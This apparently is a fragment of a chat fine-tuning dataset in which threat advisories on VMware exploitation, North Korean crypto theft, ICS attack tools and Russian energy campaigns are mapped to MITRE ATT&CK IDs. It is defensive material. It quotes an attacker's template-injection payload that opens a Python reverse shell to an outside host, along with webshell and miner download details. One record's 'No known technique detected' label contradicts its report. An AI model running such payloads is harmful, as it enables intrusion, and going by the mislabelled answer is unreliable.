binary reverse socks5 tunneling binary tlsssl support connects https14924835200sslipio additional threat actor activity trusted third party observed additional threat actor activity seem related ta1 ta2 13 april ip address 1729489112 attempted connect reverse shell compromised server ip address 1001423983 port 5410 threat actor used following command freemarkertemplateutilityexecutenewusrbinpython37 c importsocketsubprocessosssocketsocketsocketafinetsocketsockstreams connect10014239835410osdup2sfileno0 osdup2sfileno1osdup2sfileno2psubprocesscallusrbinsh victim 2 cisa received related malicious bash script analysis trusted third party analyzed script deployed around april 12 exploits cve 202222960 allows horizon user escalate privileges execute commands scripts superuser sudo bash script also allows user collect network information additional information script overwrites publishcacerthzn script fd86ald0pem file executes commands compress list files containing information network interface configuration list users passwords masterkeys hosts domains tar archive tar archive located vmware workspace one access directory optvmwarehorizonworkspacewebappssaashorizonimages assigned read write permissions horizon web user read users malicious script deletes evidence compromise overwriting publishcacerthzn fd86ald0pem removing fd86ald0pem trusted third party observed following ips downloading executing checking bash script 4572112245 11516753141 191102179197 209127110126 457285172 1922416712 trusted third party observed following additional malicious ips 2023297189 used command control 1943198141 attempted download moneroocean miner github 84541114 ran cat number files usrlocalhorizonconf 852033666 attempted pull jsp webshell http8438133149imgicongif update end detection methods signatures note servers vulnerable cve202222954 may use hypertext transfer protocol secure https encrypt clientserver communications secure sockets layer ssltransport layer security tls decryption used workaround networkbased detection threat hunting efforts following cisacreated snort signature may detect malicious network traffic related exploitation cve202222954 alert tcp httpports msgvmwarehttp get uri contains catalogportaluioauthverifyerrordeviceudidcve202222954 sid1 rev1 flowestablishedtoserver content get httpmethod contentcatalogportaluioauthverifyerrordeviceudid httpuri referencecve202222954 referenceurlgithubcomsherlocksecurityvmwarecve202222954 referenceurlgithubcomtunelkocve202222954pocblobmaincve202222954py priority2 metadataservice http following thirdparty snort signature may detect exploitation vmware workspace one access serverside template injection 10000001alert tcp externalnet httpservers httpports msgworkspace one serverside template injectioncontentget httpmethod contentfreemarkertemplateutilityexecutenocase httpuri priority1 sidrev1 update june 2 2022 alert tcp externalnet httpservers httpports msgworkspace one serverside template injectioncontentget httpmethod contentfreemarkertemplateutilityexecutenocase httpuri priority1 sid100000001rev1 update end following thirdparty yara rule may detect unmodified instances dingo jspy webshell infected hosts rule dingojspywebshell strings string1 dingolength string2 command commandtrim string3 commandaction string4 portscan string5 inetaddressgetlocalhost string6 databasemanager string7 executecommand string8 var command formcommandvalue string9 dingodyiteyecom string10 jspy ver string11 permissiondie string12 int iport integerparseint condition filesize 50kb 12 string note dingo jspy webshell example postexploitation tools actors used administrators examine network sign postexploitation activity update june 2 2022 following thirdparty yara rule may detect unmodified instances godzilla webshell infected hosts rule godzillawebshell strings string1 tomcatlistenermemshellfromthread string2 string xc string3 string pass string4 servletrequestlistener string5 cmds new string string6 cmd string7 binbash string8 getinputstream string9 javaxcryptocipher c javaxcryptociphergetinstance string10 godzilla condition filesize 20kb 10 string following thirdparty yara rule may detect unmodified instances tomcat jsp webshell infected hosts rule tomcatjspwebshell strings string1 execshellcmd string2 stcommparams string3 nkeyoffset encryptdata string4 inputstream processgetinputstream string5 process process runtimegetruntime string6 execbinary string7 byte bzkey string8 nkeyoffset string9 httpservletrequest request httpservletresponse response string10 connecttest cmd string11 exec cmd string12 file upload condition filesize 25kb 12 string following thirdparty yara rule may detect unmodified instances reverse socks proxy infected hosts rule reversesockstool md5 dc88c5fe715b5f706f9fb92547da948a strings string1 revsocks string2 connect string3 client8080 pass test string4 rsa testing key string5 settingsmaxconcurrentstreams string6 start server string7 closing connection string8 socks 1270011080 string9 revsocks listen 8080 condition uint160 0x457f filesize 6mb 8 string update end behavioral analysis indicators compromise administrators conduct behavioral analysis root accounts vulnerable systems using indicators listed table 1 detect potential malicious activity reviewing systems logs gaps logs reviewing abnormal connections assets searching commandline history auditing running processes reviewing local user accounts groups auditing active listening ports connections table 1 thirdparty iocs exploitation cve202222954 cve202222960 used around april 1214 2022 updated june 2 2022 update may 25 2022 see palo alto networks unit 42 threat brief vmware vulnerabilities exploited wild cve202222954 others additional iocs detect possible exploitation compromise note due urgency share information cisa yet validated content incident response administrators discover system compromise cisa recommends immediately isolate affected systems collect review relevant logs data artifacts consider soliciting support thirdparty incident response organization provide subject matter expertise ensure actor eradicated network avoid residual issues could enable followon exploitation report incidents cisa via cisas 247 operations center reportcisagov 8882820870 mitigations cisa recommends organizations update impacted vmware products latest version remove impacted versions organizational networks cisa endorse alternative mitigation options noted ed 2203 mitigate vmware vulnerabilities cisa expects malicious cyber actors quickly develop capability exploit newly released vulnerabilities cve202222972 cve202222973 impacted vmware products ed 2203 directs federal civilian executive branch agencies enumerate instances impacted vmware products deploy updates vmware security advisory vmsa20220014 remove affected software agency network updates applied resources ed 2203 mitigate vmware vulnerabilities vmware security advisory vmsa20220011 vmware security advisory vmsa20220014 update may 25 2022 palo alto networks unit 42 threat brief vmware vulnerabilities exploited wild cve202222954 others contact information cisa encourages recipients csa report incidents cisa via cisas 247 operations center reportcisagov 8882820870 references1 vmware security advisory vmsa202200112 ibid update june 2 2022 appendix mitre attck ttps threat actors malware used ttps table 1 exploiting cve202222954 andor cve202222960 conducting related activity see attck enterprise framework referenced threat actor tactics techniques table 2 mitre attck ttps update end references1 vmware security advisory vmsa202200112 ibid revisions initial version may 18 2022may 25 2022 added industry resourcejune 2 2022 added detection signatures iocs ttps product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1059, T1059.004, T1068, T1070, T1071.001, T1090, T1105, T1203, T1505.003, T1560, T1573.001, T1588.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today mitigate cyber threats cryptocurrency patch systems prioritize patching known exploited vulnerabilities train users recognize report phishing attempts use multifactor authentication federal bureau investigation fbi cybersecurity infrastructure security agency cisa us treasury department treasury issuing joint cybersecurity advisory csa highlight cyber threat associated cryptocurrency thefts tactics used north korean statesponsored advanced persistent threat apt group since least 2020 group commonly tracked cybersecurity industry lazarus group apt38 bluenoroff stardust chollima information north korean statesponsored malicious cyber activity visit httpswwwuscertcisagovnorthkorea us government observed north korean cyber actors targeting variety organizations blockchain technology cryptocurrency industry including cryptocurrency exchanges decentralized finance defi protocols playtoearn cryptocurrency video games cryptocurrency trading companies venture capital funds investing cryptocurrency individual holders large amounts cryptocurrency valuable nonfungible tokens nfts activity described advisory involves social engineering victims using variety communication platforms encourage individuals download trojanized cryptocurrency applications windows macos operating systems cyber actors use applications gain access victims computer propagate malware across victims network environment steal private keys exploit security gaps activities enable additional followon activities initiate fraudulent blockchain transactions us government previously published advisory north korean statesponsored cyber actors using applejeus malware steal cryptocurrency applejeus analysis north koreas cryptocurrency malware us government also previously published advisories north korean statesponsored cyber actors stealing money banks using custom malware hidden cobra fastcash campaign fastcash 20 north koreas beagleboyz robbing banks advisory provides information tactics techniques procedures ttps indicators compromise iocs stakeholders blockchain technology cryptocurrency industry help identify mitigate cyber threats cryptocurrency click herefor pdf version report click stix technical details threat update us government identified group north korean statesponsored malicious cyber actors using tactics similar previously identified lazarus group see applejeus analysis north koreas cryptocurrency malware lazarus group used applejeus trojanized cryptocurrency applications targeting individuals companiesincluding cryptocurrency exchanges financial services companiesthrough dissemination cryptocurrency trading applications modified include malware facilitates theft cryptocurrency april 2022 north koreas lazarus group actors targeted various firms entities exchanges blockchain cryptocurrency industry using spearphishing campaigns malware steal cryptocurrency actors likely continue exploiting vulnerabilities cryptocurrency technology firms gaming companies exchanges generate launder funds support north korean regime tactics techniques procedures intrusions begin large number spearphishing messages sent employees cryptocurrency companiesoften working system administration software developmentit operations devopson variety communication platforms messages often mimic recruitment effort offer highpaying jobs entice recipients download malwarelaced cryptocurrency applications us government refers tradertraitor term tradertraitor describes series malicious applications written using crossplatform javascript code nodejs runtime environment using electron framework malicious applications derived variety opensource projects purport cryptocurrency trading price prediction tools tradertraitor campaigns feature websites modern design advertising alleged features applications see figure 1 figure 1 screenshot cryptais website javascript code providing core functions software bundled webpack within code function purports update name updatechecksync downloads executes malicious payload see figure 2 update function makes http post request php script hosted tradertraitor projects domain either endpoint update oathcheckupdatephp recent variants servers response parsed json document keyvalue pair key used aes 256 encryption key cipher block chaining cbc counter ctr mode decrypt value decrypted data written file systems temporary directory provided ostmpdir method nodejs executed using childprocessexec method nodejs spawns shell child process current electron application text update finished logged shell user see observed payloads include updated macos windows variants manuscrypt custom remote access trojan rat collects system information ability execute arbitrary commands download additional payloads see north korean remote access tool copperhedge postcompromise activity tailored specifically victims environment times completed within week initial intrusion figure 2screenshot depicting updatechecksync supporting functions bundled within 60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18 associated dafom indicators compromise dafomdafom purports cryptocurrency portfolio application macho binary packaged within electron application signed apple digital signature issued apple developer team w58cykfh67 certificate associated apple developer team w58cykfh67 revoked metadata file packaged dafom application provided url hxxpsgithubcomdafomdev bug reports april 2022 page unavailable dafomdev information february 2022ip address 451422758registrar namecheap inccreated february 7 2022expires february 7 2023 60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18 tags dropper macosname dafom100dmgsize 8791 mb 92182575 bytesmd5 c2ea5011a91cd59d0396eb4fa8da7d21sha1 b2d9ca7b6d1bbbe4864ea11dfca343b7e15597d8sha256 60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18ssdeep 1572864lglbnolf9kpeikoabr2qes1b1luuqrbece6xwijkcapzpfaltiplgvnot9kpzk9tvewbxwbecr5faxzpf0m tokenaistokenais purports help build portfolio aibased trading cryptocurrencies macho binaries packaged within electron application contained apple digital signature issued apple developer team rn4btxa4sa certificate associated apple developer team rn4btxa4sa revoked application requires users register account entering email address password use features malicious tradertraitor code nodejs function called updatechecksync located file named updatejs bundled file called rendererprodjs archive called appasar function passes email address user provided system platform c2 server decrypts response using aes 256 cbc mode hardcoded initialization vector iv 34qwer78tyui key provided response writes decrypted data file executes new shell tokenaiscom information january 2022ip address 199188103115registrar namecheap inccreated january 27 2022expires january 27 2023 5b40b73934c1583144f41d8463e227529fa7157e26e6012babd062e3fd7e0b03 tags dropper macosname tokenaisappzipsize 11800 mb 123728267 bytesmd5 930f6f729e5c4d5fb52189338e549e5esha1 8e67006585e49f51db96604487138e688df732d3sha256 5b40b73934c1583144f41d8463e227529fa7157e26e6012babd062e3fd7e0b03ssdeep 3145728amfjlkvvw4zlruashrmo5vvw4zlruashrmob0dceaulktw4r2hntw4r2hnmcm cryptaiscryptais uses language tokenais advertise helps build portfolio aibased trading distributed apple disk image dmg file digitally signed apple digital signature issued apple developer team cmhd64v5r8the certificate associated apple developer team cmhd64v5r8 revoked application requires users register account entering email address password use features malicious tradertraitor code nodejs function called updatechecksync located file named updatejs bundled file called rendererprodjs archive called appasar function passes email address user provided system platform c2 server decrypts response using aes 256 ctr mode key provided response writes decrypted data file executes new shell cryptaiscom information august 2021ip address 821023114registrar namecheap inccreated august 2 2021expires august 2 2022 f0e8c29e3349d030a97f4a8673387c2e21858cccd1fb9ebbf9009b27743b2e5b tags dropper macosname cryptaisdmgsize 8036 mb 84259810 bytesmd5 4e5ebbecd22c939f0edf1d16d68e8490sha1 f1606d4d374d7e2ba756bdd4df9b780748f6dc98sha256 f0e8c29e3349d030a97f4a8673387c2e21858cccd1fb9ebbf9009b27743b2e5bssdeep 1572864jx9qowildcurjxskmogtwicckfi8jmrvgqjl2hx6qklbmrzgkzjmzdpspr0xcpkf9qotpcurdskew3coig2or6xbmrzgkzw alticgoalticgo observed packaged nullsoft scriptable install system nsis windows executables extracted electron application packaged windows executables contain simpler version tradertraitor code function exported updatechecksync located file named updatejs bundled rendererprodjs appasar archive function calls external function located file nodemodulesrequestindexjs bundled rendererprodjs make http request hxxpswwwalticgocomupdate one alticgo sample e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703ad instead contacts hxxpswwwesiletcomupdate see information esilet image resources bundled application included creai deck logo see information creai deck response written disk executed new shell using childprocessexec method nodejs unlike newer versions tradertraitor mechanism decrypt payload alticgocom information august 2020ip address 10817055202registrar netearth one inccreated august 8 2020expires august 8 2021 765a79d22330098884e0f7ce692d61c40dfcf288826342f33d976d8314cfd819 tags dropper peexe nsisname alticgoexesize 4354 mb 45656474 bytesmd5 1c7d0ae1c4d2c0b70f75eab856327956sha1 f3263451f8988a9b02268f0fb6893f7c41b906d9sha256 765a79d22330098884e0f7ce692d61c40dfcf288826342f33d976d8314cfd819ssdeep 786432optzmvdkd1mz1fggtqqlgau6jxnjmdq4ybxplev0rnjyjkosudyslgh7yvpuxi7opzkdginspau6jxnj46xec6cysihwvxcompilation timestamp 20181215 222614 utc e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703ad tags dropper peexe nsisname alticgorexesize 4458 mb 46745505 bytesmd5 855b2f4c910602f895ee3c94118e979asha1 ff17bd5abe9f4939918f27afbe0072c18df6db37sha256 e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703adssdeep 786432lptzmvdkd1mqiixubkrbwgtqqlgau6jxnjmdq4ybxplev0rnjyjkosudyslgh7yhlpzkdgzrpwgwpau6jxnj46xec6cysiicompilation timestamp 20200212 161517 utc 8acd7c2708eb1119ba64699fd702ebd96c0d59a66cba5059f4e089f4b0914925 tags dropper peexe nsisname alticgoexesize 4458 mb 46745644 bytesmd5 9a6307362e3331459d350a201ad66cd9sha1 3f2c1e60b5fac4cf1013e3e1fc688be490d71a84sha256 8acd7c2708eb1119ba64699fd702ebd96c0d59a66cba5059f4e089f4b0914925ssdeep 786432aptzmvdkd1mjpndeuxotkqqqlgau6jxnjmdq4ybxplev0rnjyjkosudyslgh7yv7apzkdgqpxeulpau6jxnj46xec6cysigcompilation timestamp 20200212 161517 utc esiletesilet claims offer live cryptocurrency prices price predictions contains simpler version tradertraitor code function exported updatechecksync located file named updatejs bundled rendererprodjs appasararchive function calls external function located file nodemodulesrequestindexjs bundled rendererprodjs make http request hxxpswwwesiletcomupdate response written disk executed new shell using childprocessexec method nodejs unlike newer versions tradertraitor mechanism decrypt payload esilet observed delivering payloads least two different macos variants manuscrypt 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efa dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156 figure 3 screenshot updatechecksync function esilet esiletcom information june 2020ip address 10416898156registrar namesilo llccreated june 12 2020expires june 12 2021 greenvideonl likely legitimate compromised information april 2022ip address 6284240140registrar flexwebhostingcreated february 26 2018expires unknown dafnefonsecacom likely legitimate compromised information june 2020ip address 15110164119registrar publicdomainregistry created august 27 2019expires august 27 2022 haciendadeclarevotcom likely legitimate compromised information june 2020ip address 185664117registrar cdmon 10dencehispahard slcreated march 2 2005expires march 2 2023 scheegorg likely legitimate compromised information june 2020ip address 16015323520registrar godaddycom llccreated june 1 2019expires june 1 2022 wwwvinoymasch likely legitimate compromised information june 2020ip address 461662238registrar cdmon 10dencehispahard slcreated january 24 2010expires unknown infodigitalnewcom likely legitimate compromised information june 2020ip address 107154160132registrar publicdomainregistrycreated june 20 2020expires june 20 2022 9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598 tags dropper macosname esiletdmgsize 7790 mb 81688694 bytes md5 53d9af8829a9c7f6f177178885901c01sha1 ae9f4e39c576555faadee136c6c3b2d358ad90b9 sha256 9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598ssdeep 1572864lffyounp5xmhvutdggnpjfvp4yebru7h8cvjmuam4du73x0unpxkulfqhbmhobpj9cyeshlqcuax0i0 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efa tags trojan machoname esilettmpzpsb3size 51037 kb 522620 bytesmd5 1ca31319721740ecb79f4b9ee74cd9b0sha1 41f855b54bf3db621b340b7c59722fb493ba39a5 sha256 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efassdeep 6144waulct94t94t97zdj1ibkjhkbjz8bz87zmsj71obv7nobno7nztb7hmt5etz8iwdskt1ubg2lirfbpr9mjgpmn c2 endpoints hxxpsgreenvideonlwpcontentthemestopphp hxxpsdafnefonsecacomwpcontentthemestopphp hxxpshaciendadeclarevotcomwpcontenttopphp dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156 tags trojan machoname esilettmpg7lpp size 3824 kb 39156 bytesmd5 9578c2be6437dcc8517e78a5de1fa975sha1 d2a77c31c3e169bec655068e96cf4e7fc52e77b8sha256 dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156ssdeep 384sdaws0fdtmkny4fpk6htyquitnikmcgr7luryesll4yg9rpewruifj8ttjodysdaycky4fei9mhyl9rbrny6y c2 endpoints hxxpsscheegorgpluginstopphp hxxpswwwvinoymaschwpcontentpluginstopphp hxxpsinfodigitalnewcomwpcontentpluginstopphp creai deckcreai deck claims platform artificial intelligence deep learning droppers identified filenames samples win32bin darwin64bin match naming conventions used versions tradertraitor downloading payload samples manuscrypt contact hxxpsaidecknetboardphp c2 using http post requests multipartformdata contenttypes creaideckcom information march 2020ip address 38132124161registrar namecheap inccreated march 9 2020expires march 9 2021 aidecknet information june 2020ip address 89454151registrar namecheap inccreated june 22 2020expires june 22 2021 867c8b49d29ae1f6e4a7cd31b6fe7e278753a1ba03d4be338ed11fd1efc7dd36 tags trojan peexename win32binsize 210 mb 2198684 bytesmd5 5d43baf1c9e9e3a939e5defd8f8fbd8dsha1 d5ff73c043f3bb75dd749636307500b60a436550 sha256 867c8b49d29ae1f6e4a7cd31b6fe7e278753a1ba03d4be338ed11fd1efc7dd36ssdeep 24576y3sy2m3bmr7cdgslbjbr4nzzy95vv7cexvesz2esrhsv3d95oacompilation timestamp 20200623 060635 utc 89b5e248c222ebf2cb3b525d3650259e01cf7d8fff5e4aa15ccd7512b1e63957 tags trojan machoname darwin64binsize 644 mb 6757832 bytesmd5 8397ea747d2ab50da4f876a36d673272sha1 48a6d5141e25b6c63ad8da20b954b56afe589031sha256 89b5e248c222ebf2cb3b525d3650259e01cf7d8fff5e4aa15ccd7512b1e63957ssdeep 49152kih1keh7zixldywvhb26hrktrwwfs62sradnhejndvol3oxl5zpffqbnihztvffkih1kehi1lojtm2spb mitigations north korean statesponsored cyber actors use full array tactics techniques exploit computer networks interest acquire sensitive cryptocurrencyintellectual property gain financial assets us government recommends implementing mitigations protect critical infrastructure organizations well financial sector organizations blockchain technology cryptocurrency industry apply defenseindepth security strategy apply security principlessuch least access models defenseindepthto user application privileges help prevent exploitation attempts successful use network segmentation separate networks zones based roles requirements separate network zones help prevent lateral movement throughout organization limit attack surface see nsas top ten cybersecurity mitigation strategies strategies enterprise organizations use build defenseindepth security posture implement patch management initial followon exploitation involves leveraging common vulnerabilities exposures cves gain access networked environment organizations timely vulnerability patch management program place mitigate exposure critical cves prioritize patching internetfacing devices monitored accordingly malicious logic attacks enforce credential requirements multifactor authentication north korean malicious cyber actors continuously target user credentials email social media private business accounts organizations ensure users change passwords regularly reduce impact password spraying brute force techniques us government recommends organizations implement enforce multifactor authentication mfa reduce risk credential theft aware mfa interception techniques mfa implementations monitor anomalous logins educate users social engineering social media spearphishing north korean actors rely heavily social engineering leveraging email social media platforms build trust send malicious documents unsuspecting users cybersecurity aware workforce one best defenses social engineering techniques like phishing user training include identify social engineering techniques awareness open links attachments trusted senders implement email domain mitigations maintain awareness themed emails surrounding current events malicious cyber actors use current events lure potential victims observed covid19 pandemic organizations robust domain security solution includes leveraging reputation checks closely monitoring blocking newly registered domains nrds enterprise traffic nrds commonly established threat actors prior malicious engagement html email scanning organizations disable html used emails scan email attachments embedded scripts may hard antivirus product detect fragmented additional malware scanning interface product integrated combine potentially malicious payloads send payload primary antivirus product hyperlinks emails also scanned opened precautionary measures reduce likelihood user clicking malicious link endpoint protection although network security critical devices mobility often means traveling connecting multiple different networks offer varying levels security reduce risk introducing exposed hosts critical networks organizations ensure mobile devices installed security suites detect mitigate malware enforce application security application allowlisting enables organization monitor programs allow approved allowlist execute allowlisting helps stop initial attack even user clicks malicious link opens malicious attachment implement baseline rule sets nsas limiting location data exposure guidance block execution unauthorized malicious programs disable macros office products macros common method executing code attached office document office products allow disabling macros originate outside organization providing hybrid approach organization depends legitimate use macros windows specific settings configured block internetoriginated macros running done group policy administrative templates associated office products specifically word excel powerpoint productivity software libreoffice openoffice configured set macro security level aware thirdparty downloadsespecially cryptocurrency applications north korean actors increasingly active currency generation operations users always verify file downloads ensure source reputable primary preferred source thirdparty vendor malicious cyber actors continuously demonstrated ability trojanize applications gain foothold host devices create incident response plan respond possible cyber intrusions plan include reporting incidents fbi cisaquick reporting reduce severity incidents provide valuable information investigators contact information found contact organizations also report anomalous cyber activity andor cyber incidents 247 toreportcisagovor calling 1844saycisa 18447292472 andor fbi via local fbi field office fbis 247 cywatch 855 2923937 cywatchfbigov disclaimer information advisory provided informational purposes fbi cisa treasury provide warranties kind regarding information endorse commercial product service including subjects analysis revisions initial version april 18 2022 product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today protect icsscada devices enforce multifactor authentication remote access ics networks devices whenever possible change passwords icsscada devices systems consistent schedule especially default passwords deviceunique strong passwords mitigate password brute force attacks give defender monitoring systems opportunities detect common attacks leverage properly installed continuous ot monitoring solution log alert malicious indicators behaviors department energy doe cybersecurity infrastructure security agency cisa national security agency nsa federal bureau investigation fbi releasing joint cybersecurity advisory csa warn certain advanced persistent threat apt actors exhibited capability gain full system access multiple industrial control system icssupervisory control data acquisition scada devices including schneider electric programmable logic controllers plcs omron sysmac nex plcs open platform communications unified architecture opc ua servers apt actors developed custommade tools targeting icsscada devices tools enable scan compromise control affected devices established initial access operational technology ot network additionally actors compromise windowsbased engineering workstations may present information technology ot environments using exploit compromises asrock motherboard driver known vulnerabilities compromisingand maintaining full system access icsscada devices apt actors could elevate privileges move laterally within ot environment disrupt critical devices functions doe cisa nsa fbi urge critical infrastructure organizations especially energy sector organizations implement detection mitigation recommendations provided csa detect potential malicious apt activity harden icsscada devices click herefor pdf version report technical details apt actors developed custommade tools established initial access ot network enables scan compromise control certain icsscada devices including following schneider electric modicon modicon nano plcs including may limited tm251 tm241 m258 m238 lmc058 lmc078 omron sysmac nj nx plcs including may limited nex nx1p2 nxsl3300 nxecc203 nj5011300 s8vk r88d1sn10fect opc unified architecture opc ua servers apt actors tools modular architecture enable cyber actors conduct highly automated exploits targeted devices tools virtual console command interface mirrors interface targeted icsscada device modules interact targeted devices enabling operations lowerskilled cyber actors emulate higherskilled actor capabilities apt actors leverage modules scan targeted devices conduct reconnaissance device details upload malicious configurationcode targeted device back restore device contents modify device parameters addition apt actors use tool installs exploits knownvulnerable asrocksigned motherboard driver asrdrv103sys exploiting cve202015368 execute malicious code windows kernel successful deployment tool allow apt actors move laterally within ot environment disrupt critical devices functions apt tool schneider electric devices apt actors tool schneider electric devices modules interact via normal management protocols modbus tcp 502 modules may allow cyber actors run rapid scan identifies schneider plcs local network via user datagram protocol udp multicast destination port 27127 note udp 27127 standard discovery scan used engineering workstations discover plcs may indicative malicious activity bruteforce schneider electric plc passwords using codesys available device protocols via udp port 1740 defaults dictionary word list note capability may work codesysbased devices depending individual design function report updated information becomes available conduct denialofservice attack prevent network communications reaching plc sever connections requiring users reauthenticate plc likely facilitate capture credentials conduct packet death attack crash plc power cycle configuration recovery conducted send custom modbus commands note capability may work modbus schneider electric plcs refer appendix tactics techniques procedures ttps associated tool apt tool omron apt actors tool omron devices modules interact scanning omron using factory interface network service fins protocol parsing hypertext transfer protocol http response omron devices retrieving media access control mac address device polling specific devices connected plc backing uprestoring arbitrary files tofrom plc loading custom malicious agent omron plcs additional attackerdirected capability additionally omron modules upload agent allows cyber actor connect initiate commandssuch file manipulation packet captures code executionvia http andor hypertext transfer protocol secure https refer appendix ttps associated tool apt tool opc ua apt actors tool opc ua modules basic functionality identify opc ua servers connect opc ua server using default previously compromised credentials client read opc ua structure server potentially write tag values available via opc ua threat tool significantly reduced properly configuring opc ua security refer mitigations information refer appendix ttps associated tool mitigations note mitigations provided enable network defenders begin efforts protect systems devices new capabilities verified every environment tested prior implementing doe cisa nsa fbi recommend organizations icsscada devices implement following proactive mitigations isolate icsscada systems networks corporate internet networks using strong perimeter controls limit communications entering leaving icsscada perimeters enforce multifactor authentication remote access ics networks devices whenever possible cyber incident response plan exercise regularly stakeholders cybersecurity operations change passwords icsscada devices systems consistent schedule especially default passwords deviceunique strong passwords mitigate password brute force attacks give defender monitoring systems opportunities detect common attacks ensure opc ua security correctly configured application authentication enabled explicit trust lists ensure opc ua certificate private keys user passwords stored securely maintain knowngood offline backups faster recovery upon disruptive attack conduct hashing integrity checks firmware controller configuration files ensure validity backups limit icsscada systems network connections specifically allowed management engineering workstations robustly protect management systems configuring device guard credential guard hypervisor code integrity hvci install endpoint detection response edr solutions subnets ensure strong antivirus file reputation settings configured implement robust log collection retention icsscada systems management subnets leverage continuous ot monitoring solution alert malicious indicators behaviors watching internal systems communications known hostile actions lateral movement enhanced network visibility potentially identify abnormal traffic consider using cisas opensource industrial control systems network protocol parsers icsnpp ensure applications installed necessary operation enforce principle least privilege use admin accounts required tasks installing software updates investigate symptoms denial service connection severing exhibit delays communications processing loss function requiring reboot delayed actions operator comments signs potential malicious activity monitor systems loading unusual drivers especially asrock driver asrock driver normally used system resources additional guidance securing ot devices see layering network security segmentation stop malicious cyber activity connected operational technology nsa cisa recommend immediate actions reduce exposure across operational technologies control systems additional guidance securing opc ua enabled devices see practical security recommendations building opc ua applications information apt actors tools ttps refer mandiants blog incontroller new statesponsored cyber attack tools target multiple industrial control systems dragos blog chernovitespipedreammalware targeting industrial control systems disclaimer information report provided informational purposes doe cisa nsa fbi endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring doe cisa nsa fbi guidance shall used advertising product endorsement purposes acknowledgements doe cisa nsa fbi would like thank dragos mandiant microsoft palo alto networks schneider electricfor contributions joint csa appendix apt cyber tools tactics techniques procedures see tables 1 3 ttps associated cyber actors tools described csa mapped mitre attck ics framework see attck ics framework referenced threat actor tactics techniques table 1 apt tool schneider electric ics ttps table 2 apt tool omron ics ttps table 3apt tool opc ua ics ttps contact information organizations also report anomalous cyber activity andor cyber incidents 247 saycisacisadhsgovor calling 1844saycisa 18447292472 andor fbi via local fbi field office fbis 247 cywatch 855 2923937 cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact nsa client requirements general cybersecurity inquiries contact cybersecurity requirements center 4108544200 cybersecurityrequestsnsagov revisions april 13 2022 initial versionapril 14 2022 added resourcesmay 25 2022 added additional mitigations resources product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0807, T0814, T0816, T0821, T0834, T0836, T0843, T0845, T0846, T0853, T0855, T0857, T0858, T0859, T0861, T0881, T0886, T0888, T0889"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today protect energy sector networks implement ensure robust network segmentation ics networks enforce mfa authenticate system manage creation modification use ofand permissions associated withprivileged accounts joint cybersecurity advisory csacoauthored cybersecurity infrastructure security agency cisa federal bureau investigation fbi department energy doeprovides information multiple intrusion campaigns conducted statesponsored russian cyber actors 2011 2018 targeted us international energy sector organizations cisa fbi doe responded campaigns appropriate action around time occurred cisa fbi doe sharing information order highlight historical tactics techniques procedures ttps used adversaries target us international energy sector organizations march 24 2022 us department justice unsealed indictments three russian federal security service fsb officers russian federation central scientific research institute chemistry mechanics tsniikhm employee involvement following intrusion campaigns us international oil refineries nuclear facilities energy companies1 global energy sector intrusion campaign 2011 2018 fsb conducted multistage campaign gained remote access us international energy sector networks deployed icsfocused malware collected exfiltrated enterprise icsrelated data one indicted fsb officers involved campaign activity involved deploying havex malware victim networks two indicted fsb officers involved activity targeting us energy sector networks 2016 2018 compromise middle eastbased energy sector organization triton malware 2017 russian cyber actors ties tsniikhm gained access leveraged triton also known hatman malware manipulate foreign oil refinerys ics controllers triton designed specifically target schneider electrics triconex tricon safety systems capable disrupting systems schneider electric issued patch mitigate risk triton malwares attack vector however network defenders install patch remain vigilant threat actors ttps indicted tsniikhm cyber actor charged attempt access us protected computer networks cause damage energy facility indicted tsniikhm cyber actor coconspirator deployment triton malware 2017 csa provides ttps used indicted fsb tsniikhm actors cyber operations global energy sector specifically advisory maps ttps used global energy sector campaign compromise middle eastbased energy sector organization mitre attck enterprise attck ics frameworks cisa fbi doe assess statesponsored russian cyber operations continue pose threat us energy sector networks cisa fbi doe urge energy sector critical infrastructure organizations apply recommendations listed mitigations section advisory appendix reduce risk compromise information russian statesponsored malicious cyber activity see cisas russia cyber threat overview advisories webpage information threat russian statesponsored malicious cyber actors us critical infrastructure well additional mitigation recommendations see joint csa understanding mitigating russian statesponsored cyber threats us critical infrastructure cisas shields technical guidance webpage rewards justice program information statesponsored russian cyber operations targeting us critical infrastructure contact department states dos rewards justice program may eligible reward 10 million dos offering information leading identification location person acting direction control foreign government participates malicious cyber activity us critical infrastructure violation computer fraud abuse act cfaa contact 12027027843 whatsapp signal telegram send information via rewards justice secure torbased tips line located dark web details refer rewardsforjusticenet click herefor pdf version report technical details notethis advisory uses mitre attck 